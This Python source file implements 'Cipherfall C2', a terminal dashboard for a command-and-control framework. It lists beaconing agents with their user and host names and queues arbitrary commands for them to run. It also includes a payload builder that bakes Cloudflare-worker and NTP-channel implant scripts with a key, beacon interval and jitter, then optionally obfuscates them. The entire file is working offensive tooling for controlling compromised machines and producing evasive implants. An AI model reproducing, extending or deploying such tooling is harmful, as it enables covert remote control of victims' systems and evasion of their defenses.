#!/usr/bin/env python3
"""
tui.py — Cipherfall C2 Terminal Dashboard (NullRelay / ClockVenom)

Two-tab interactive TUI:
  Agents  — list active agents, browse task history, dispatch commands.
            Agents auto-appear as soon as they beacon; no manual registration.
  Payload — bake cloudflare/agent.py or ntp/agent.py with custom settings
            (type, interval, jitter, PSK, worker URL) and optionally obfuscate.

Usage:
    python tui.py

Keys:
    Enter   select agent / task, submit command
    r       force refresh
    q       quit
"""

import asyncio, json, os, pathlib, re, subprocess, sys, time
from rich.text import Text
from dotenv import load_dotenv
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Horizontal, Vertical
from textual.widgets import (
    Button, DataTable, Footer, Header, Input,
    Label, RichLog, Select, Static, Switch, TabbedContent, TabPane,
)
import httpx

load_dotenv()

BASE         = f"http://127.0.0.1:{os.environ.get('C2_ADMIN_PORT', '1337')}"
_DEFAULT_URL = os.environ.get("WORKER_URL", "").rstrip("/")
_DEFAULT_PSK = os.environ.get("C2_PSK", "")
TASK_COLORS  = {"done": "green", "sent": "yellow", "pending": "red"}
HERE         = pathlib.Path(__file__).parent


def _ts(epoch: int) -> str:
    return time.strftime("%H:%M:%S", time.localtime(epoch))


def _ago(epoch: int) -> str:
    d = int(time.time()) - epoch
    if d < 60:   return f"{d}s"
    if d < 3600: return f"{d // 60}m"
    return f"{d // 3600}h"


def _patch_agent(src: str, psk: str, interval: int, jitter: int) -> str:
    src = re.sub(
        r'BEACON_INT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
        f'BEACON_INT = int(os.environ.get("C2_INT", "{interval}"))',
        src,
    )
    src = re.sub(
        r'JITTER\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
        f'JITTER     = int(os.environ.get("C2_JITTER", "{jitter}"))',
        src,
    )
    src = re.sub(
        r'C2_PSK\s*=\s*os\.environ\.get\([^)]+\)',
        f'C2_PSK     = os.environ.get("C2_PSK", "{psk}")',
        src,
    )
    return src


def _bake_agent_cloudflare(worker_url: str, psk: str, interval: int,
                            jitter: int, out_name: str) -> pathlib.Path:
    src = (HERE / "cloudflare-worker" / "nullrelay.py").read_text(encoding="utf-8")
    src = re.sub(
        r'WORKER_URL\s*=\s*os\.environ\.get\([^)]+\)',
        f'WORKER_URL = os.environ.get("WORKER_URL", "{worker_url}")',
        src,
    )
    src = re.sub(
        r'PSK\s*=\s*os\.environ\.get\([^)]+\)',
        f'PSK        = os.environ.get("C2_PSK", "{psk}")',
        src,
    )
    src = re.sub(
        r'BEACON_INT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
        f'BEACON_INT = int(os.environ.get("C2_INT", "{interval}"))',
        src,
    )
    src = re.sub(
        r'JITTER\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
        f'JITTER     = int(os.environ.get("C2_JITTER", "{jitter}"))',
        src,
    )
    out = HERE / out_name
    out.write_text(src, encoding="utf-8")
    return out


def _bake_agent_ntp(psk: str, interval: int, jitter: int,
                    out_name: str) -> pathlib.Path:
    ntp_agent = HERE / "ntp" / "clockvenom.py"
    if not ntp_agent.exists():
        raise FileNotFoundError(f"ntp agent not found: {ntp_agent}")
    src = _patch_agent(ntp_agent.read_text(encoding="utf-8"), psk, interval, jitter)
    out = HERE / out_name
    out.write_text(src, encoding="utf-8")
    return out


def _obfuscate(agent_path: pathlib.Path) -> pathlib.Path:
    obf = HERE.parent / "Obfuscator" / "shadowscript.py"
    if not obf.exists():
        raise FileNotFoundError(f"obfuscator not found: {obf}")
    subprocess.run([sys.executable, str(obf), str(agent_path)], check=True)
    return agent_path.parent / (agent_path.stem + "_obf.py")



CSS = """
Screen { background: #0d1117; }

TabbedContent          { height: 1fr; }
TabbedContent > TabPane { padding: 0; height: 1fr; }

/* ── Agents tab ── */
#agents-layout { height: 1fr; }

#left {
    width: 52;
    border: solid #30363d;
    margin: 1 1 0 1;
}
#right {
    border: solid #30363d;
    margin: 1 1 0 0;
}

#agents-table { height: 1fr; }
#tasks-table  { height: 10; border-bottom: solid #30363d; }
#output-log   { height: 1fr; padding: 0 1; }

#cmd-input {
    margin: 1 1 1 1;
    border: solid #388bfd;
}

/* ── Payload tab ── */
#payload-outer {
    align: center top;
    padding: 2 4;
    height: 1fr;
}
#payload-inner {
    width: 72;
}
.form-row   { height: 3; margin-bottom: 1; }
.form-label { width: 14; color: #8b949e; content-align: right middle; padding-right: 2; }

#btn-generate  { width: 72; margin-top: 1; }
#payload-status { padding: 1 1; height: 3; }
#row-url { height: 3; margin-bottom: 1; }

/* ── Shared ── */
Label {
    background: #161b22;
    color: #388bfd;
    text-style: bold;
    padding: 0 1;
    width: 100%;
}
.form-label {
    background: transparent;
    text-style: none;
    color: #8b949e;
    width: 14;
}
"""


class CipherfallTUI(App):
    TITLE = "CIPHERFALL C2"
    CSS   = CSS

    BINDINGS = [
        Binding("q", "quit", "Quit"),
        Binding("r", "do_refresh", "Refresh"),
    ]

    _selected_agent: str | None = None
    _selected_task:  str | None = None

    # ── Layout ───────────────────────────────────────────────────────────────

    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)

        with TabbedContent():

            with TabPane("Agents", id="tab-agents"):
                with Vertical():
                    with Horizontal(id="agents-layout"):
                        with Vertical(id="left"):
                            yield Label(" AGENTS")
                            yield DataTable(id="agents-table", cursor_type="row",
                                            zebra_stripes=True)
                        with Vertical(id="right"):
                            yield Label(" TASKS")
                            yield DataTable(id="tasks-table", cursor_type="row",
                                            zebra_stripes=True)
                            yield Label(" OUTPUT")
                            yield RichLog(id="output-log", highlight=True, markup=True)
                    yield Input(placeholder="select an agent first", id="cmd-input")

            with TabPane("Payload", id="tab-payload"):
                with Vertical(id="payload-outer"):
                    with Vertical(id="payload-inner"):
                        yield Label(" PAYLOAD BUILDER")
                        with Horizontal(classes="form-row"):
                            yield Label("AGENT TYPE", classes="form-label")
                            yield Select(
                                [("cloudflare", "cloudflare"), ("ntp", "ntp")],
                                id="p-type", value="cloudflare",
                            )
                        with Horizontal(classes="form-row", id="row-url"):
                            yield Label("WORKER URL", classes="form-label")
                            yield Input(id="p-url", value=_DEFAULT_URL)
                        with Horizontal(classes="form-row"):
                            yield Label("C2 PSK", classes="form-label")
                            yield Input(id="p-psk", password=True, value=_DEFAULT_PSK)
                        with Horizontal(classes="form-row"):
                            yield Label("BEACON (s)", classes="form-label")
                            yield Input(id="p-int", value="30")
                        with Horizontal(classes="form-row"):
                            yield Label("JITTER (s)", classes="form-label")
                            yield Input(id="p-jitter", value="10")
                        with Horizontal(classes="form-row"):
                            yield Label("OBFUSCATION", classes="form-label")
                            yield Switch(id="p-obf", value=True)
                        with Horizontal(classes="form-row"):
                            yield Label("OUTPUT FILE", classes="form-label")
                            yield Input(id="p-out", value="agent_payload.py")
                        yield Button("GENERATE PAYLOAD", id="btn-generate", variant="primary")
                        yield Static("", id="payload-status")

        yield Footer()

    # ── Lifecycle ────────────────────────────────────────────────────────────

    async def on_mount(self) -> None:
        self.query_one("#agents-table", DataTable).add_columns(
            "", "ID", "Label", "Last seen", "User@Host", "Pending"
        )
        self.query_one("#tasks-table", DataTable).add_columns(
            "ID", "Command", "Status", "Time"
        )
        await self._load_agents()
        self.set_interval(5.0, self._load_agents)

    # ── Data ─────────────────────────────────────────────────────────────────

    async def _load_agents(self) -> None:
        try:
            async with httpx.AsyncClient() as c:
                ag_r  = await c.get(f"{BASE}/admin/agents", timeout=3)
                tsk_r = await c.get(f"{BASE}/admin/tasks",  timeout=3)
        except Exception:
            return

        agents    = ag_r.json()
        all_tasks = tsk_r.json()

        pending: dict[str, int] = {}
        for task in all_tasks:
            if task["status"] in ("pending", "sent"):
                pending[task["agent_id"]] = pending.get(task["agent_id"], 0) + 1

        t = self.query_one("#agents-table", DataTable)
        t.clear()
        for a in agents:
            info  = json.loads(a.get("sysinfo") or "{}")
            alive = int(time.time()) - a["last_seen"] < 120
            n     = pending.get(a["id"], 0)
            t.add_row(
                Text("●", style="green" if alive else "red"),
                a["id"][:8],
                a.get("label") or "—",
                _ago(a["last_seen"]),
                f"{info.get('user', '?')}@{info.get('hostname', '?')}",
                Text(str(n), style="yellow") if n else Text("—", style="dim"),
                key=a["id"],
            )

        if self._selected_agent:
            await self._load_tasks(self._selected_agent)

    async def _load_tasks(self, agent_id: str) -> None:
        try:
            async with httpx.AsyncClient() as c:
                r = await c.get(f"{BASE}/admin/tasks", timeout=3)
                tasks = [t for t in r.json() if t["agent_id"] == agent_id]
        except Exception:
            return

        t = self.query_one("#tasks-table", DataTable)
        t.clear()
        for task in tasks:
            cmd = task["command"]
            t.add_row(
                task["id"][:8],
                (cmd[:30] + "…") if len(cmd) > 30 else cmd,
                Text(task["status"], style=TASK_COLORS.get(task["status"], "white")),
                _ts(task["created_at"]),
                key=task["id"],
            )

        if self._selected_task:
            await self._show_output(self._selected_task)

    async def _show_output(self, task_id: str) -> None:
        try:
            async with httpx.AsyncClient() as c:
                r = await c.get(f"{BASE}/admin/result/{task_id}", timeout=3)
                task = r.json()
        except Exception:
            return

        log = self.query_one("#output-log", RichLog)
        log.clear()
        log.write(f"[bold cyan]$ {task['command']}[/bold cyan]")
        if task.get("output"):
            log.write(task["output"])
        else:
            log.write("[dim]waiting for output…[/dim]")

    # ── Events ───────────────────────────────────────────────────────────────

    async def on_data_table_row_selected(self, event: DataTable.RowSelected) -> None:
        tid = event.data_table.id
        if tid == "agents-table":
            self._selected_agent = str(event.row_key.value)
            self._selected_task  = None
            self.query_one("#cmd-input", Input).placeholder = \
                f"agent {self._selected_agent[:8]} — type a command and press Enter"
            await self._load_tasks(self._selected_agent)
        elif tid == "tasks-table":
            self._selected_task = str(event.row_key.value)
            await self._show_output(self._selected_task)

    async def on_input_submitted(self, event: Input.Submitted) -> None:
        if event.input.id != "cmd-input":
            return
        cmd = event.value.strip()
        if not cmd or not self._selected_agent:
            return
        event.input.value = ""
        try:
            async with httpx.AsyncClient() as c:
                r = await c.post(
                    f"{BASE}/admin/task",
                    json={"agent_id": self._selected_agent, "command": cmd},
                    timeout=3,
                )
                result = r.json()
        except Exception as e:
            self.query_one("#output-log", RichLog).write(f"[red]error: {e}[/red]")
            return

        log = self.query_one("#output-log", RichLog)
        log.clear()
        log.write(f"[yellow]queued  →  task {result['task_id'][:8]}[/yellow]")
        await self._load_tasks(self._selected_agent)

    def on_select_changed(self, event: Select.Changed) -> None:
        if event.select.id != "p-type":
            return
        is_cf = event.value == "cloudflare"
        self.query_one("#row-url").display = is_cf

    async def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id != "btn-generate":
            return

        status = self.query_one("#payload-status", Static)
        status.update("[yellow]generating…[/yellow]")

        agent_type = self.query_one("#p-type",   Select).value
        worker_url = self.query_one("#p-url",    Input).value.strip().rstrip("/")
        psk        = self.query_one("#p-psk",    Input).value.strip()
        interval   = int(self.query_one("#p-int",    Input).value.strip() or "30")
        jitter     = int(self.query_one("#p-jitter", Input).value.strip() or "10")
        obfuscate  = self.query_one("#p-obf",    Switch).value
        out_name   = self.query_one("#p-out",    Input).value.strip() or "agent_payload.py"

        try:
            if agent_type == "ntp":
                out = await asyncio.to_thread(
                    _bake_agent_ntp, psk, interval, jitter, out_name
                )
            else:
                out = await asyncio.to_thread(
                    _bake_agent_cloudflare, worker_url, psk, interval, jitter, out_name
                )
            if obfuscate:
                out = await asyncio.to_thread(_obfuscate, out)
            status.update(f"[green]✓  {agent_type} agent → {out.name}[/green]")
        except Exception as e:
            status.update(f"[red]error: {e}[/red]")

    def action_do_refresh(self) -> None:
        asyncio.ensure_future(self._load_agents())


if __name__ == "__main__":
    CipherfallTUI().run()
